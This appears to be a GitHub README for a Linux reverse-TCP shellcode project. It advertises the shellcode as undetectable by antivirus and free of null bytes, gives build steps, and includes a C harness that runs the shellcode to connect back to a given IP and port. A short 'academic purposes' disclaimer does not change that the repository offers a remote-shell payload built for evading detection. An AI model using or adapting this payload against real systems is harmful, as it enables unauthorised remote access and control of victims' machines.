# Reverse_tcp-Shellcode-Linux
Best reverse_tcp shellcode for linux on github, undetectable, garanty no nullbytes.

## /!\ Disclaimer /!\

This repository is for academic purposes, the use of this software is your responsibility.  
Its forbidden to use it in any illegal ways  

## Overview

This is a reverse_tcp shellcode that you can use in C.  
Its garanty no nullbytes, you can safely strlen, strcpy on it.  
Can't be detected by AVs.  
You'll need execstack to build it, to make the stack executable.  
  
### Build
Take a look at build.sh  
```sh
    $ ./build.sh
```

### Example

```c
    #include "shellcode.h"

    int main(void)
    {
        unsigned char reverse_tcp[sizeof(shellcode)];

        memcpy(reverse_tcp, shellcode, sizeof(shellcode));

        void (*funcptr)(unsigned int, unsigned short) = (void (*)(unsigned int,  short unsigned int))reverse_tcp;

        funcptr(inet_addr("127.0.0.1"), htons(2626));
    }
```
